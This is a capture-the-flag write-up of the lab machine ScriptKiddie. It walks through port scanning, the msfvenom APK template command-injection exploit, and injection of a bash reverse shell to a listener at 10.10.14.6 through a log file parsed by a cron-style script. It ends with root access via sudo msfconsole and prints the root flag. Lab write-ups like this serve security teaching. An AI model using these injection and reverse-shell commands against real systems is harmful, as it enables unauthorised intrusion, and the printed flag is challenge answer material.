ScriptKiddie
============
![alt_text](https://github.com/Healops/Writeups/blob/main/ScriptKiddie/Images/ScriptKiddie.jpg)  

Skills received
---
  *Hello

Enumeration
------
For port scanning I'll use following script
````
#!/bin/bash
masscan --rate=3000 -e tun0 -p1-65535 $1 > $2
mkdir Scan-results/$2
cat $2 | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr "\n" ',' | sed 's/,$//' > Scan-results/$2/$2-ports
rm $2
ports=`cat Scan-results/$2/$2-ports`
nmap -T4 -Pn -sV -sC -oA Scan-results/$2/$2-version $1 -p$ports
rm Scan-results/$2/$2-version.xml
rm Scan-results/$2/$2-version.gnmap
````
````
./Scan-script.sh 10.10.10.226 ScriptKiddie
````
There are some open ports
```
# Nmap 7.91 scan initiated Sat Feb  6 23:42:44 2021 as: nmap -T4 -Pn -sV -sC -oA Scan-results/ScriptKiddie/ScriptKiddie-version -p22,5000 10.129.72.252
Nmap scan report for 10.129.72.252
Host is up (0.19s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
|_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
|_http-server-header: Werkzeug/0.16.1 Python/3.8.5
|_http-title: k1d'5 h4ck3r t00l5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Feb  6 23:43:03 2021 -- 1 IP address (1 host up) scanned in 18.61 seconds
```
SSH works at standart port 22 and http service at uncommon port 5000

After editing /etc/host let's see a web page on skriptkiddie.htb:5000
```
10.10.10.226    scriptkiddie.htb
```

![alt_text](https://github.com/Healops/Writeups/blob/main/ScriptKiddie/Images/Web%20page.PNG)

Foothold/User 1
---
There are three options available  
Nmap, msfvenom and searchsploit are executed on the server and we can see the result
![alt_text](https://github.com/Healops/Writeups/blob/main/ScriptKiddie/Images/nmap.PNG)

![alt_text](https://github.com/Healops/Writeups/blob/main/ScriptKiddie/Images/msfvenom.PNG)

![alt_text](https://github.com/Healops/Writeups/blob/main/ScriptKiddie/Images/searchsploit.PNG)

We can assume that commands can be executed on the server without any filtering of user input and try to execute something on the server

![alt_text](https://github.com/Healops/Writeups/blob/main/ScriptKiddie/Images/ls.PNG)

![alt_text](https://github.com/Healops/Writeups/blob/main/ScriptKiddie/Images/nmap%20ls.PNG)

But everything is filtered

Attemption generate reverse shell for linux with msfvenom on server and execute it don't work because of some problems on the server

![alt_text](https://github.com/Healops/Writeups/blob/main/ScriptKiddie/Images/revsh.PNG)

Searching for an exploit for one of the tools led me to the msfvenom vulnerability that can be exploited with metasploit 6

```
msf6 > search msfvenom

Matching Modules
================

   #  Name                                                                    Disclosure Date  Rank       Check  Description
   -  ----                                                                    ---------------  ----       -----  -----------
   0  exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection  2020-10-29       excellent  No     Rapid7 Metasploit Framework msfvenom APK Template Command Injection


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection
```

We can create APK template for msfvenom tool on the victim server and after execute msfvenom command for android we'll get revers-shell

```
msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > use 0
[*] Using configured payload cmd/unix/reverse_netcat
msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > show options

Module options (exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   FILENAME  msf.apk          yes       The APK file name


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.6       yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

   **DisablePayloadHandler: True   (no handler will be created!)**


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > exploit

[+] msf.apk stored at /root/.msf4/local/msf.apk
```
Now we can load our payload as template to get nc back connect  
![alt_text](https://github.com/Healops/Writeups/blob/main/ScriptKiddie/Images/apk.PNG)

```
msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > use /multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.14.6
LHOST => 10.10.14.6
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.10.14.6:4444 
[*] Command shell session 1 opened (10.10.14.6:4444 -> 10.10.10.226:41092) at 2021-02-13 12:05:51 -0500

ls
__pycache__
app.py
static
templates
python3 -c 'import pty; pty.spawn("/bin/bash")'
kid@scriptkiddie:~/html$ ls
ls
__pycache__  app.py  static  templates
```
And we got first user Kid

Privilege escalation
---
Let's explore the home directory of Kid

```
kid@scriptkiddie:~/html$ cd /home
cd /home
kid@scriptkiddie:/home$ ls
ls
kid  pwn
kid@scriptkiddie:/home$ cd kid
cd kid
kid@scriptkiddie:~$ ls
ls
html  logs  snap  user.txt
kid@scriptkiddie:~$ ls -a
ls -a
.              .bashrc  .local    .sudo_as_admin_successful  user.txt
..             .bundle  .msf4     html
.bash_history  .cache   .profile  logs
.bash_logout   .gnupg   .ssh      snap
```
There is app.py file in html folder. We can see searchsploit function in it
```
def searchsploit(text, srcip):                                                                                                                                                              
    if regex_alphanum.match(text):                                                                                                                                                          
        result = subprocess.check_output(['searchsploit', '--color', text])                                                                                                                 
        return render_template('index.html', searchsploit=result.decode('UTF-8', 'ignore'))                                                                                                 
    else:                                                                                                                                                                                   
        with open('/home/kid/logs/hackers', 'a') as f:
            f.write(f'[{datetime.datetime.now()}] {srcip}\n')
        return render_template('index.html', sserror="stop hacking me - well hack you back")
```
If we'll try to run it with text in search field it will run searchsploit tool, else the server will write IP address and date-time information into /home/kid/logs/hackers file

The hackers file is empty 
```
kid@scriptkiddie:~/logs$ ls   
ls
hackers
kid@scriptkiddie:~/logs$ cat hackers
cat hackers
```
Searching for something to use for privilege escalation i found the script 'scanlosers.sh' in a pwn user home directory
```
kid@scriptkiddie:~/logs$ cd /home/pwn
cd /home/pwn
kid@scriptkiddie:/home/pwn$ ls
ls
recon  scanlosers.sh
```
The script contains the following commands
```
#!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
```
As we can see it takes ip address (or everything after the second space) and tries to run nmap to scan it and then clears the file   
I copied the script on my local system to explore it

Let's see what information the script gets from the file
```
┌──(root💀kali)-[/home/…/Scan/Scan-results/ScriptKiddie/test]
└─# echo '123 456 789 123' > logs
                                                                                                                                                                                            
┌──(root💀kali)-[/home/…/Scan/Scan-results/ScriptKiddie/test]
└─# cat logs | cut -d' ' -f3-
789 123
```
It takes everything after the second space and puts this in the ip variable  
We can inject something after the second space to try to escalete privileges  
Lets test it
```
┌──(root💀kali)-[/home/…/Scan/Scan-results/ScriptKiddie/test]
└─# echo '1 1 ;ls;' > logs   
                                                                                                                                                                                            
┌──(root💀kali)-[/home/…/Scan/Scan-results/ScriptKiddie/test]
└─# ./scanlosers.sh
                                                                                                                                                                                            
Failed to open normal output file recon/ for writing
QUITTING!
logs  recon  scanlosers.sh
sh: 1: .nmap: not found
logs  recon  scanlosers.sh
```
As we can see it run the 'ls' comand  
Let's try it on the victim server
```
kid@scriptkiddie:~/logs$ echo '1 1 ;touch /home/kid/logs/hello;' > hackers
echo '1 1 ;touch /home/kid/logs/hello;' > hackers
kid@scriptkiddie:~/logs$ ls
ls
hackers  hello
```
And it works

Now we can inject reverse-shell command after the seccond space for privilege escalation
```
kid@scriptkiddie:~/logs$ echo "1 1 ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.6/4444 0>&1';" > hackers
```
On the Kali side
```
┌──(root💀kali)-[/home/…/Scan/Scan-results/ScriptKiddie/ssh]
└─# nc -lvp 4444                                                                                                                                                                      130 ⨯
listening on [any] 4444 ...
connect to [10.10.14.6] from scriptkiddie.htb [10.10.10.226] 50500
bash: cannot set terminal process group (866): Inappropriate ioctl for device
bash: no job control in this shell
pwn@scriptkiddie:~$
```
And we got the second user

root
-----
Let's use (sudo -l) command to see if we can run something with super user rights
```
pwn@scriptkiddie:~$ sudo -l
sudo -l
Matching Defaults entries for pwn on scriptkiddie:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pwn may run the following commands on scriptkiddie:
    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
```
And that's it, we can run msfconsole as a super user
```
pwn@scriptkiddie:~$ sudo msfconsole
sudo msfconsole
                                                  
     ,           ,
    /             \
   ((__---,,,---__))
      (_) O O (_)_________
         \ _ /            |\
          o_o \   M S F   | \
               \   _____  |  *
                |||   WW|||
                |||     |||


       =[ metasploit v6.0.9-dev                           ]
+ -- --=[ 2069 exploits - 1122 auxiliary - 352 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: Use help <command> to learn more about any command
```

```
msf6 > cat /root/root.txt
[*] exec: cat /root/root.txt

f8896c6c014df77b4d000c7b69a136d3
```
Using msfconsole we can execute every command with super user rights, in this case we read the root.txt file from root folder
